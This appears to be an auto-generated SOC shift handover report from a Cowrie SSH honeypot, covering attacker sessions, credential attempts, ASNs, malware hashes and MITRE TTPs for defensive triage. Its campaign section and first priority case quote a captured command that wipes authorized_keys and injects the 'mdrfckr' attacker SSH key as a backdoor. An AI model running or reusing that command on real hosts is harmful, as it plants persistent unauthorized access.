# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-30 |
| **Generated At** | 2026-03-30T20:42:57Z |
| **Shift Time** | 20:42 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **69** |
| Confirmed Threats | **52** |
| False Positives Filtered | **17** (24.6%) |
| Unique Attacker IPs | **27** |
| Countries of Origin | **16** |
| High Severity Cases | **3** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **66** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **20** |
| Unique Credential Pairs | **20** |
| Unique Usernames | **14** |
| Unique Passwords | **19** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 4 |
| `config` | 3 |
| `centos` | 2 |
| `supervisor` | 1 |
| `pi` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `112233` | 2 |
| `9` | 1 |
| `supervisor888` | 1 |
| `qwerty1` | 1 |
| `admin2` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `config` | `9` | 1 |
| `supervisor` | `supervisor888` | 1 |
| `pi` | `qwerty1` | 1 |
| `admin2` | `admin2` | 1 |
| `azureuser` | `azureuser` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `jl@123456` | `185.158.22.150` | 2026-03-30T19:26:31 |
| `root` | `3245gs5662d34` | `185.158.22.150` | 2026-03-30T19:26:36 |
| `root` | `admin` | `192.42.116.44` | 2026-03-30T19:51:22 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `185.158.22.150`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **27** |
| Unique ASNs | **21** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS12400` | Partner Communications Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS210022` | Trade Link Logistics General Trading & Contracting Company W.L.L., L.L.C. | 1 | HIGH |
| `AS9050` | Orange Romania S.A. | 1 | HIGH |
| `AS215125` | Church of Cyberology | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (3)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-89fd0f9c7b23

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-03-30 19:26 |
| **Last Seen** | 2026-03-30 19:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 19:26:30` | `cowrie.session.connect` |
| `2026-03-30 19:26:30` | `cowrie.client.version` |
| `2026-03-30 19:26:30` | `cowrie.client.kex` |
| `2026-03-30 19:26:31` | `cowrie.login.success` |
| `2026-03-30 19:26:31` | `cowrie.session.params` |
| `2026-03-30 19:26:31` | `cowrie.command.input` |
| `2026-03-30 19:26:31` | `cowrie.command.failed` |
| `2026-03-30 19:26:32` | `cowrie.log.closed` |
| `2026-03-30 19:26:32` | `cowrie.session.params` |
| `2026-03-30 19:26:32` | `cowrie.command.input` |
| `2026-03-30 19:26:32` | `cowrie.session.file_download` |
| `2026-03-30 19:26:32` | `cowrie.log.closed` |
| `2026-03-30 19:26:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c5533995d2e

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-03-30 19:26 |
| **Last Seen** | 2026-03-30 19:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 19:26:35` | `cowrie.session.connect` |
| `2026-03-30 19:26:35` | `cowrie.client.version` |
| `2026-03-30 19:26:35` | `cowrie.client.kex` |
| `2026-03-30 19:26:36` | `cowrie.login.success` |
| `2026-03-30 19:26:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6576f7caa519

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]44` |
| **First Seen** | 2026-03-30 19:51 |
| **Last Seen** | 2026-03-30 19:51 |
| **Session Duration** | 24s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 19:51:20` | `cowrie.session.connect` |
| `2026-03-30 19:51:20` | `cowrie.client.version` |
| `2026-03-30 19:51:21` | `cowrie.client.kex` |
| `2026-03-30 19:51:22` | `cowrie.client.fingerprint` |
| `2026-03-30 19:51:22` | `cowrie.login.failed` |
| `2026-03-30 19:51:22` | `cowrie.login.success` |
| `2026-03-30 19:51:43` | `cowrie.direct-tcpip.request` |
| `2026-03-30 19:51:44` | `cowrie.direct-tcpip.ja4` |
| `2026-03-30 19:51:44` | `cowrie.direct-tcpip.data` |
| `2026-03-30 19:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]44` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.26.82[.]244` | **25** | 2026-03-30 19:26 | 2026-03-30 19:32 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `158.94.209[.]131` | **3** | 2026-03-30 19:20 | 2026-03-30 19:26 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.65.195[.]57` | **2** | 2026-03-30 18:59 | 2026-03-30 18:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `114.33.223[.]137` | 1 | 2026-03-30 19:48 | 2026-03-30 19:48 | 30s | 0 | `T1592` | 🟢 LOW |
| `117.80.139[.]158` | 1 | 2026-03-30 20:38 | 2026-03-30 20:38 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.22[.]219` | 1 | 2026-03-30 19:46 | 2026-03-30 19:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `138.84.59[.]78` | 1 | 2026-03-30 20:40 | 2026-03-30 20:42 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `146.56.182[.]39` | 1 | 2026-03-30 19:40 | 2026-03-30 19:40 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-03-30 19:49 | 2026-03-30 19:50 | 31s | 0 | `T1592` | 🟢 LOW |
| `183.195.131[.]206` | 1 | 2026-03-30 19:13 | 2026-03-30 19:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.158.22[.]150` | 1 | 2026-03-30 19:26 | 2026-03-30 19:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.55.70[.]26` | 1 | 2026-03-30 19:58 | 2026-03-30 19:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.21.241[.]50` | 1 | 2026-03-30 20:00 | 2026-03-30 20:00 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.161.52[.]149` | 1 | 2026-03-30 19:21 | 2026-03-30 19:21 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `41.59.228[.]160` | 1 | 2026-03-30 20:04 | 2026-03-30 20:04 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.59.97[.]98` | 1 | 2026-03-30 19:44 | 2026-03-30 19:44 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.151[.]32` | 1 | 2026-03-30 19:19 | 2026-03-30 19:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.34.17[.]130` | 1 | 2026-03-30 18:59 | 2026-03-30 19:00 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.92.124[.]116` | 1 | 2026-03-30 20:20 | 2026-03-30 20:20 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.197.6[.]173` | 1 | 2026-03-30 19:01 | 2026-03-30 19:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `82.102.149[.]88` | 1 | 2026-03-30 20:24 | 2026-03-30 20:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.84.21[.]186` | 1 | 2026-03-30 20:18 | 2026-03-30 20:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `146.56.182[.]39` | KR | Oracle Corporation , Global software solutions , California , USA | **100** ⚠️ | 26 |
| `78.197.6[.]173` | FR | Free SAS | **100** ⚠️ | 50 |
| `192.42.116[.]44` | NL | TOR EXIT AND MORE | **100** ⚠️ | 50 |
| `61.92.124[.]116` | HK | Hong Kong Broadband Network Ltd | **100** ⚠️ | 12 |
| `158.94.209[.]131` | NL | OMEGATECH | **100** ⚠️ | 10 |
| `138.84.59[.]78` | BR | Starlink Brazil Serviços de Internet Ltd | **100** ⚠️ | 4 |
| `59.34.17[.]130` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `220.161.52[.]149` | CN | CHINANET Fujian province network | **100** ⚠️ | 47 |
| `150.246.249[.]149` | JP | So-net Service | **100** ⚠️ | 50 |
| `82.102.149[.]88` | IL | Partner Communications Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 23 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 17 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (17 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 69 cases |
| Tool 34  | Credential Extractor        | ✅ 20 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 27 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 17 filtered (24.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 3 priority case(s) shown individually · 22 recon entry/entries in table (3 group(s) consolidating 30 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-30T20:42:57Z_
